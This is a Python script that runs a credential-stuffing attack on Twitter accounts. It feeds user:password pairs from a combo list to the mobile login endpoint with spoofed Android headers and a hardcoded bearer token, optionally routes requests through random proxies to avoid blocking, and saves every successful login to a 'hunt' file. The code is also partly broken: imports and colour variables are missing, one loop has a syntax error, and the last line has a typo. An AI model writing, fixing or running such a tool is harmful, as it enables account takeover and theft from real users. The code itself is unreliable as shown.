import os

banner = (G+"""

____                 _

|  _ \               | |

| |_) | __ _ _______ | | ____ _

|  _ < / _` |_  / _ \| |/ / _` |

| |_) | (_| |/ / (_) |   < (_| |

|____/ \__,_/___\___/|_|\_\__,_|

 

                                                        

""")

print(banner)

def Guess_without_proxies(user,pasw):

    global hunt,error,bad,banner

    try:

        print(Y+f'[-] {user}:{pasw}')

        token_url = 'https://api.twitter.com/1.1/guest/activate.json'

        token_hed = {

            'User-Agent': 'TwitterAndroid/8.87.0-release.01 (28870001-r-1) SM-G935F/7.1.2 (samsung;SM-G935F;samsung;SM-G935F;0;;1;2012)',

            'Authorization': 'Bearer AAAAAAAAAAAAAAAAAAAAAFXzAwAAAAAAMHCxpeSDG1gLNLghVe8d74hl6k4%3DRUMF4xAQLsbeBhTSRrCiQpJtxoGWeyHrDb5te2jpGskWDFW82F',

        }

        get_token = requests.post(token_url,headers=token_hed).json()['guest_token']

        url = "https://api.twitter.com/auth/1/xauth_password.json"

        head = {

            'Cache-Control': 'no-store',

            'X-B3-TraceId': 'bc35545e2885cf69',

            'OS-Security-Patch-Level': '2017-10-05',

            'X-Twitter-Client-Flavor': '',

            'User-Agent': 'TwitterAndroid/8.87.0-release.01 (28870001-r-1) SM-G935F/7.1.2 (samsung;SM-G935F;samsung;SM-G935F;0;;1;2012)',

            'Accept-Encoding': 'gzip, deflate',

            'X-Twitter-Client-AdID': '143f8c1d-0dab-495e-bdba-6b8f3216d92f',

            'Timezone': 'Asia/Shanghai',

            'X-Twitter-Client-Limit-Ad-Tracking': '0',

            'X-Twitter-Client-DeviceID': 'c0575264c704f9c6',

            'X-Twitter-Client': 'TwitterAndroid',

            'X-Twitter-Client-Language': 'ar-EG',

            'X-Twitter-API-Version': '5',

            'att': '1-p8YDwE1eClUMxxzR8MHgZpnUFyhpILYjFUzExuRI',

            'Optimize-Body': 'true',

            'X-Twitter-Active-User': 'yes',

            'X-Twitter-Client-Version': '8.87.0-release.01',

            'X-Guest-Token': f'{get_token}',

            'X-Client-UUID': 'f55fe15f-b1f4-4406-9dd7-e0eb18b841ec',

            'Accept': 'application/json',

            'Authorization': 'Bearer AAAAAAAAAAAAAAAAAAAAAFXzAwAAAAAAMHCxpeSDG1gLNLghVe8d74hl6k4%3DRUMF4xAQLsbeBhTSRrCiQpJtxoGWeyHrDb5te2jpGskWDFW82F',

            'Accept-Language': 'ar-EG',

            'Content-Type': 'application/x-www-form-urlencoded',

            'Content-Length': '140',

            'Host': 'api.twitter.com',

            'Connection': 'close',

            'Cookie': 'personalization_id=v1_PV0kGHiFp5r175R1KzBEzg==; guest_id=v1%3A161752602861069129'

        }

        data = {

            'x_auth_identifier': user,

            'x_auth_password': pasw,

            'send_error_codes':'true',

            'x_auth_login_challenge':'1',

            'x_auth_login_verification':'1',

            'ui_metrics': ''

        }

        sleep(0.2)

        login = requests.post(url,headers=head,data=data).text

        if 'oauth_token' in login:

            with open('hunt.txt','a') as dd:

                dd.write(f'{user}:{pasw}\n')

            hunt +=1

            os.system('cls' if os.name == 'nt' else 'clear')

            print(f'{banner}\n[-] Hunt : {hunt}\n[-] Bad : {bad}\n[-] Error : {error}')

        else:

            bad +=1

            os.system('cls' if os.name == 'nt' else 'clear')

            print(f'{banner}\n[-] Hunt : {hunt}\n[-] Bad : {bad}\n[-] Error : {error}')

    except:

        error +=1

        os.system('cls' if os.name == 'nt' else 'clear')

        print(f'{banner}\n[-] Hunt : {hunt}\n[-] Bad : {bad}\n[-] Error : {error}')

def Guess_with_proxies(user,pasw):

    global hunt,error,bad,banner

    try:

        print(Y+f'[-] {user}:{pasw}')

        token_url = 'https://api.twitter.com/1.1/guest/activate.json'

        token_hed = {

            'User-Agent': 'TwitterAndroid/8.87.0-release.01 (28870001-r-1) SM-G935F/7.1.2 (samsung;SM-G935F;samsung;SM-G935F;0;;1;2012)',

            'Authorization': 'Bearer AAAAAAAAAAAAAAAAAAAAAFXzAwAAAAAAMHCxpeSDG1gLNLghVe8d74hl6k4%3DRUMF4xAQLsbeBhTSRrCiQpJtxoGWeyHrDb5te2jpGskWDFW82F',

        }

        get_token = requests.post(token_url,headers=token_hed).json()['guest_token']

        url = "https://api.twitter.com/auth/1/xauth_password.json"

        head = {

            'Cache-Control': 'no-store',

            'X-B3-TraceId': 'bc35545e2885cf69',

            'OS-Security-Patch-Level': '2017-10-05',

            'X-Twitter-Client-Flavor': '',

            'User-Agent': 'TwitterAndroid/8.87.0-release.01 (28870001-r-1) SM-G935F/7.1.2 (samsung;SM-G935F;samsung;SM-G935F;0;;1;2012)',

            'Accept-Encoding': 'gzip, deflate',

            'X-Twitter-Client-AdID': '143f8c1d-0dab-495e-bdba-6b8f3216d92f',

            'Timezone': 'Asia/Shanghai',

            'X-Twitter-Client-Limit-Ad-Tracking': '0',

            'X-Twitter-Client-DeviceID': 'c0575264c704f9c6',

            'X-Twitter-Client': 'TwitterAndroid',

            'X-Twitter-Client-Language': 'ar-EG',

            'X-Twitter-API-Version': '5',

            'att': '1-p8YDwE1eClUMxxzR8MHgZpnUFyhpILYjFUzExuRI',

            'Optimize-Body': 'true',

            'X-Twitter-Active-User': 'yes',

            'X-Twitter-Client-Version': '8.87.0-release.01',

            'X-Guest-Token': f'{get_token}',

            'X-Client-UUID': 'f55fe15f-b1f4-4406-9dd7-e0eb18b841ec',

            'Accept': 'application/json',

            'Authorization': 'Bearer AAAAAAAAAAAAAAAAAAAAAFXzAwAAAAAAMHCxpeSDG1gLNLghVe8d74hl6k4%3DRUMF4xAQLsbeBhTSRrCiQpJtxoGWeyHrDb5te2jpGskWDFW82F',

            'Accept-Language': 'ar-EG',

            'Content-Type': 'application/x-www-form-urlencoded',

            'Content-Length': '140',

            'Host': 'api.twitter.com',

            'Connection': 'close',

            'Cookie': 'personalization_id=v1_PV0kGHiFp5r175R1KzBEzg==; guest_id=v1%3A161752602861069129'

        }

        data = {

            'x_auth_identifier': user,

            'x_auth_password': pasw,

            'send_error_codes':'true',

            'x_auth_login_challenge':'1',

            'x_auth_login_verification':'1',

            'ui_metrics': ''

        }

        prox = open('proxies.txt', 'r').read().splitlines()

        rprox = str(random.choice(prox))

        proxies = {'http':'http://{}'.format(rprox), 'https':'https://{}'.format(rprox)}

        login = requests.post(url,headers=head,data=data,proxies=proxies,timeout=8).text

        if 'oauth_token' in login:

            with open('hunt.txt','a') as dd:

                dd.write(f'{user}:{pasw}\n')

            hunt +=1

            os.system('cls' if os.name == 'nt' else 'clear')

            print(f'{banner}\n[-] Hunt : {hunt}\n[-] Bad : {bad}\n[-] Error : {error}')

        else:

            bad +=1

            os.system('cls' if os.name == 'nt' else 'clear')

            print(f'{banner}\n[-] Hunt : {hunt}\n[-] Bad : {bad}\n[-] Error : {error}')

    except:

        error +=1

        os.system('cls' if os.name == 'nt' else 'clear')

        print(f'{banner}\n[-] Hunt : {hunt}\n[-] Bad : {bad}\n[-] Error : {error}')

user = "Bazoka"

password = "A.Bazoka"

word1 = ""

word2 = ""

while word1 !=user :

	word1 = input("Enter user: ")	while word2 !=password :

		word2 = input("Enter password: ")

		if word2 !=password :

			print("try again")

			

action = input(Y+"""

[1] Guess Without Proxies

[2] Guess With Proxies

[3] Choice Your Action : """)

if action == '2':

    for acc in open('combo.txt','r').read().splitlines():

        try:

            user = acc.split(':')[0]

            pasw = acc.split(':')[1]

            Guess_with_proxies(user,pasw)

        except:

            pass

else:

    for account in open('combo.txt','r').read().splitlines():

        try:

            user = account.split(':')[0]

            pasw = account.split(':')[1]

            Guess_without_proxies(user,pasw)

        except:

            pas
